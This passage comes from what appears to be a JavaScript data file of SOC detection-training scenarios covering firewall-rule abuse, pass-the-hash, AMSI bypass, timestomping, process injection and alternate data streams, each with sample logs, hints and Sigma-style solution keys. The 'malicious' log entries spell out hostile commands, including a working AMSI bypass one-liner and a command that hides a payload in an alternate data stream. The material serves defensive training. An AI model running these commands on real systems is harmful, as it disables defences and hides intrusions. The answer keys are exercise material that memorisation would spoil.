        timestamp: 'Nov 26 11:05:00',
        host: 'WORKSTATION-25',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\netsh.exe',
        commandLine: 'netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow program="C:\\temp\\beacon.exe"',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 21203,
        timestamp: 'Nov 26 11:10:00',
        host: 'SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\netsh.exe',
        commandLine: 'netsh interface ip show config',
        user: 'CORP\\netadmin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "firewall add rule" in netsh commands' },
      { cost: 100, content: 'Filter on netsh.exe with CommandLine containing firewall and add' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'netsh.exe\'\\n    CommandLine|contains|all:\\n      - \'firewall\'\\n      - \'add\'\\n      - \'rule\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21202],
    starterCode: `# Detect firewall rule manipulation

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 13: Pass-the-Hash Indicators
  {
    id: 'L2-013',
    title: 'Pass-the-Hash Attack',
    level: 2,
    difficulty: 4,
    logSource: 'authentication',
    mitre: {
      tactic: 'Lateral Movement',
      tacticId: 'TA0008',
      technique: 'T1550.002',
      techniqueName: 'Use Alternate Authentication Material: Pass the Hash',
      url: 'https://attack.mitre.org/techniques/T1550/002/'
    },
    realWorldReference: {
      incidents: ['APT groups', 'Mimikatz usage', 'Active Directory attacks'],
      description: 'Pass-the-Hash uses NTLM hashes for authentication without knowing the password. Detected by logon type 9 with NTLM.',
      year: '2008-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L2-013</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL</span></p>
        </div>
        <p><strong>Intelligence:</strong> Pass-the-Hash activity detected. NTLM authentication from unusual sources.</p>
        <p><strong>Objective:</strong> Detect logon type 9 (NewCredentials) with NTLM authentication - indicates PTH.</p>
      </div>
    `,
    logs: [
      {
        id: 21301,
        timestamp: 'Nov 27 12:00:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        targetUser: 'admin',
        logonType: '3',
        authPackage: 'Kerberos',
        sourceIP: '192.168.1.100',
        success: true,
        malicious: false
      },
      {
        id: 21302,
        timestamp: 'Nov 27 12:05:00',
        host: 'DC01',
        severity: 'CRIT',
        logSource: 'authentication',
        targetUser: 'domain_admin',
        logonType: '9',
        authPackage: 'NTLM',
        sourceIP: '192.168.1.55',
        success: true,
        malicious: true
      },
      {
        id: 21303,
        timestamp: 'Nov 27 12:10:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        targetUser: 'svc_backup',
        logonType: '5',
        authPackage: 'Negotiate',
        sourceIP: '192.168.1.50',
        success: true,
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Logon type 9 with NTLM authentication is suspicious' },
      { cost: 100, content: 'Filter on LogonType 9 and AuthPackage NTLM' },
      { cost: 200, content: 'detection:\\n  selection:\\n    LogonType: \'9\'\\n    AuthPackage: \'NTLM\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21302],
    starterCode: `# Detect Pass-the-Hash attacks

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 14: AMSI Bypass
  {
    id: 'L2-014',
    title: 'AMSI Bypass Attempt',
    level: 2,
    difficulty: 3,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1562.001',
      techniqueName: 'Impair Defenses: Disable or Modify Tools',
      url: 'https://attack.mitre.org/techniques/T1562/001/'
    },
    realWorldReference: {
      incidents: ['Cobalt Strike', 'PowerShell Empire', 'Most modern malware'],
      description: 'AMSI (Antimalware Scan Interface) bypass allows malicious PowerShell to evade detection.',
      year: '2016-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #L2-014</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> AMSI bypass techniques detected. Attackers are attempting to evade PowerShell logging.</p>
        <p><strong>Objective:</strong> Detect PowerShell commands attempting to bypass AMSI using common techniques.</p>
      </div>
    `,
    logs: [
      {
        id: 21401,
        timestamp: 'Nov 28 13:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-Help about_Execution_Policies',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 21402,
        timestamp: 'Nov 28 13:05:00',
        host: 'WORKSTATION-30',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 21403,
        timestamp: 'Nov 28 13:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-ExecutionPolicy -List',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "AmsiUtils" or "amsiInitFailed" in PowerShell commands' },
      { cost: 100, content: 'Filter on CommandLine containing AMSI-related strings' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'powershell.exe\'\\n    CommandLine|contains:\\n      - \'AmsiUtils\'\\n      - \'amsiInitFailed\'\\n      - \'AmsiScanBuffer\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21402],
    starterCode: `# Detect AMSI bypass attempts

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 15: Timestomping Detection
  {
    id: 'L2-015',
    title: 'Time Manipulation',
    level: 2,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1070.006',
      techniqueName: 'Indicator Removal: Timestomp',
      url: 'https://attack.mitre.org/techniques/T1070/006/'
    },
    realWorldReference: {
      incidents: ['APT groups', 'Anti-forensics techniques'],
      description: 'Timestomping modifies file timestamps to blend malicious files with legitimate system files.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-gray-500 pl-4">
          <h3 class="font-bold text-gray-400">Incident Report #L2-015</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-orange-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> File timestamp manipulation detected. Attackers are using timestomping to hide malicious files.</p>
        <p><strong>Objective:</strong> Detect PowerShell commands that modify file timestamps using common timestomping techniques.</p>
      </div>
    `,
    logs: [
      {
        id: 21501,
        timestamp: 'Nov 29 14:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-Item C:\\file.txt | Select-Object LastWriteTime',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 21502,
        timestamp: 'Nov 29 14:05:00',
        host: 'WORKSTATION-35',
        severity: 'WARN',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe (Get-Item C:\\temp\\malware.exe).LastWriteTime = "01/01/2019 00:00:00"',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 21503,
        timestamp: 'Nov 29 14:10:00',
        host: 'FILE-SRV',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\robocopy.exe',
        commandLine: 'robocopy C:\\source D:\\backup /MIR',
        user: 'CORP\\backup_svc',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for LastWriteTime, CreationTime being set in PowerShell' },
      { cost: 100, content: 'Filter on CommandLine containing time property assignments' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'powershell.exe\'\\n    CommandLine|contains:\\n      - \'.LastWriteTime\'\\n      - \'.CreationTime\'\\n      - \'.LastAccessTime\'\\n    CommandLine|contains: \'=\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21502],
    starterCode: `# Detect timestomping attempts

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 16: Process Injection Indicators
  {
    id: 'L2-016',
    title: 'Process Injection',
    level: 2,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1055',
      techniqueName: 'Process Injection',
      url: 'https://attack.mitre.org/techniques/T1055/'
    },
    realWorldReference: {
      incidents: ['Cobalt Strike', 'Metasploit', 'Most advanced malware'],
      description: 'Process injection techniques use API calls like CreateRemoteThread, VirtualAllocEx to inject code into other processes.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L2-016</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL</span></p>
        </div>
        <p><strong>Intelligence:</strong> Process injection activity detected. Suspicious API calls being made via PowerShell.</p>
        <p><strong>Objective:</strong> Detect PowerShell commands using injection-related API calls.</p>
      </div>
    `,
    logs: [
      {
        id: 21601,
        timestamp: 'Nov 30 15:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-Process | Where-Object {$_.WorkingSet -gt 100MB}',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 21602,
        timestamp: 'Nov 30 15:05:00',
        host: 'WORKSTATION-40',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024); [Kernel32]::VirtualAllocEx($handle, $null, 4096, 0x3000, 0x40)',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 21603,
        timestamp: 'Nov 30 15:10:00',
        host: 'DEV-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGVsbG8="))',
        user: 'CORP\\developer',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for VirtualAlloc, CreateRemoteThread, WriteProcessMemory in commands' },
      { cost: 100, content: 'Filter on CommandLine containing memory allocation API calls' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'powershell.exe\'\\n    CommandLine|contains:\\n      - \'VirtualAlloc\'\\n      - \'CreateRemoteThread\'\\n      - \'WriteProcessMemory\'\\n      - \'AllocHGlobal\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21602],
    starterCode: `# Detect process injection indicators

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 17: Alternate Data Stream (ADS) Usage
  {
    id: 'L2-017',
    title: 'Hidden Data Streams',
    level: 2,
    difficulty: 3,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1564.004',
      techniqueName: 'Hide Artifacts: NTFS File Attributes',
      url: 'https://attack.mitre.org/techniques/T1564/004/'
    },
    realWorldReference: {
      incidents: ['APT groups', 'Bitpaymer ransomware', 'Astaroth'],
      description: 'NTFS Alternate Data Streams can hide malicious content within legitimate files.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-cyan-500 pl-4">
          <h3 class="font-bold text-cyan-400">Incident Report #L2-017</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-orange-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> Alternate Data Streams being used to hide data. This is a common evasion technique.</p>
        <p><strong>Objective:</strong> Detect commands that interact with NTFS Alternate Data Streams using the colon (:) syntax.</p>
      </div>
    `,
    logs: [
      {
        id: 21701,
        timestamp: 'Dec 01 16:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c dir C:\\Users',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 21702,
        timestamp: 'Dec 01 16:05:00',
        host: 'WORKSTATION-45',
        severity: 'WARN',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c type C:\\temp\\payload.exe > C:\\Windows\\System32\\calc.exe:hidden.exe',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 21703,
        timestamp: 'Dec 01 16:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c echo %PATH%',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'ADS uses filename:streamname syntax' },
      { cost: 100, content: 'Look for .exe: or file paths with colons followed by names' },
      { cost: 200, content: 'detection:\\n  selection:\\n    CommandLine|re: \'\\.[a-z]{2,4}:[a-zA-Z]\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21702],
    starterCode: `# Detect Alternate Data Stream usage

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  }
];

export default LEVEL_2_SCENARIOS;
